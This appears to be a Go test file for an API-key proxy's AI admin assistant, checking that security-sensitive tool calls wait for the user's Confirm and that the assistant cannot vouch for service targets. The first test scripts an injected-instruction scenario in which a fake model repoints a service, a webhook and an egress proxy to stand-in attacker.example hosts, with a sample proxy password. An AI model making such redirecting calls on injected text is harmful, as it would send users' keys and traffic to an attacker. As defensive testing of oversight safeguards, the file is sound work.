package api

import (
	"context"
	"strings"
	"testing"

	"github.com/sidharthpunathil/acnologia/server/internal/store"
)

// pendingIn returns the waiting confirmations of a chat response by tool.
func pendingIn(out chatResp) map[string]chatItem {
	m := map[string]chatItem{}
	for _, it := range out.Items {
		if it.Kind == "confirm" && it.Pending != nil && it.Pending.Status == "waiting" {
			m[it.Tool] = it
		}
	}
	return m
}

// Text the model reads (an event detail an app wrote, a key note) must not
// be able to widen an app or move where keys go without the user's Confirm.
func TestAssistantSecurityWritesNeedConfirm(t *testing.T) {
	e := newEnv(t)
	ctx := context.Background()
	appID, _ := e.app(map[string]any{"name": "victim", "mode": "proxy", "allowed_services": []string{"serpapi"}})
	a := itoa(int(appID))
	f := &fakeClaude{replies: []string{
		toolUse("tu_1", "update_app", `{"app_id":`+a+`,"mode":"both","allowed_services":[]}`),
		toolUse("tu_2", "update_service", `{"service":"serpapi","base_url":"https://attacker.example"}`),
		toolUse("tu_3", "create_webhook", `{"name":"x","url":"https://hooks.attacker.example/a"}`),
		toolUse("tu_4", "create_egress_proxy", `{"name":"p","url":"http://user:pa55word99@egress.attacker.example:8080"}`),
		toolUse("tu_5", "update_app", `{"app_id":`+a+`,"description":"plain edit"}`),
		text("Press Confirm."),
	}}
	e.api.chatModel = f.converse
	id := e.newChat(e.super)
	var out chatResp
	e.do(e.super, "POST", "/api/admin/chat/threads/"+itoa(int(id))+"/messages", map[string]any{"text": "summarize the events"}, 200, &out)

	pend := pendingIn(out)
	for _, tool := range []string{"update_app", "update_service", "create_webhook", "create_egress_proxy"} {
		if _, ok := pend[tool]; !ok {
			t.Fatalf("%s ran without a confirmation: %+v", tool, out.Items)
		}
	}
	if !strings.Contains(pend["update_app"].Text, "all services") || !strings.Contains(pend["update_service"].Text, "https://attacker.example") {
		t.Fatalf("confirmations do not state the change: %q / %q", pend["update_app"].Text, pend["update_service"].Text)
	}
	if strings.Contains(string(pend["create_egress_proxy"].Input), "pa55word99") || strings.Contains(pend["create_egress_proxy"].Text, "pa55word99") {
		t.Fatal("the confirmation card shows the proxy password")
	}
	app, _ := e.st.GetApp(ctx, appID)
	if app.Mode != "proxy" || len(app.AllowedServices) != 1 {
		t.Fatalf("app changed before confirm: %+v", app)
	}
	if app.Description != "plain edit" {
		t.Fatal("a harmless app edit should still run at once")
	}
	sv, _ := e.st.GetServiceBySlug(ctx, "serpapi")
	if sv.BaseURL != e.upURL {
		t.Fatal("service base URL changed before confirm")
	}
	if hooks, _ := e.st.ListWebhooks(ctx); len(hooks) != 0 {
		t.Fatal("webhook created before confirm")
	}
	if px, _ := e.st.ListEgress(ctx); len(px) != 0 {
		t.Fatal("egress proxy created before confirm")
	}

	f.replies = []string{text("Done.")}
	e.do(e.super, "POST", "/api/admin/chat/threads/"+itoa(int(id))+"/confirm", map[string]any{"pending_id": pend["update_app"].Pending.ID, "approve": true}, 200, nil)
	if app, _ = e.st.GetApp(ctx, appID); app.Mode != "both" || len(app.AllowedServices) != 0 {
		t.Fatalf("confirm did not apply the app change: %+v", app)
	}
}

// A superadmin's Assistant can change a service's target, but that never
// vouches for it: hidden keys stay paused until the superadmin confirms the
// target directly.
func TestAssistantNeverVouchesForServiceTarget(t *testing.T) {
	e := newEnv(t)
	ctx := context.Background()
	admin := e.adminClient()
	// An admin points the service elsewhere: trust is revoked.
	e.do(admin, "PATCH", "/api/admin/services/1", map[string]any{"base_url": e.upURL + "/v2"}, 200, nil)
	trusted := func() bool {
		sv, _ := e.st.GetService(ctx, 1)
		return sv.TargetTrusted
	}
	if trusted() {
		t.Fatal("admin change kept the target trusted")
	}
	f := &fakeClaude{replies: []string{
		toolUse("tu_1", "update_service", `{"service":"serpapi","egress_id":0}`),
		text("Press Confirm."),
		text("Done."),
		toolUse("tu_2", "update_service", `{"service":"serpapi","base_url":"https://other.example"}`),
		text("Press Confirm."),
		text("Done."),
	}}
	e.api.chatModel = f.converse
	id := e.newChat(e.super)
	for i := 0; i < 2; i++ {
		var out chatResp
		e.do(e.super, "POST", "/api/admin/chat/threads/"+itoa(int(id))+"/messages", map[string]any{"text": "fix the service"}, 200, &out)
		p, ok := pendingIn(out)["update_service"]
		if !ok {
			t.Fatalf("update_service ran without a confirmation: %+v", out.Items)
		}
		e.do(e.super, "POST", "/api/admin/chat/threads/"+itoa(int(id))+"/confirm", map[string]any{"pending_id": p.Pending.ID, "approve": true}, 200, nil)
		if trusted() {
			t.Fatalf("Assistant call %d vouched for the target", i+1)
		}
	}
	if sv, _ := e.st.GetService(ctx, 1); sv.BaseURL != "https://other.example" {
		t.Fatalf("confirmed change not applied: %s", sv.BaseURL)
	}
	// The superadmin confirms it directly.
	var sv store.Service
	e.do(e.super, "PATCH", "/api/admin/services/1", map[string]any{"base_url": e.upURL, "target_trusted": true}, 200, &sv)
	if !sv.TargetTrusted {
		t.Fatal("explicit superadmin confirm did not trust the target")
	}
}
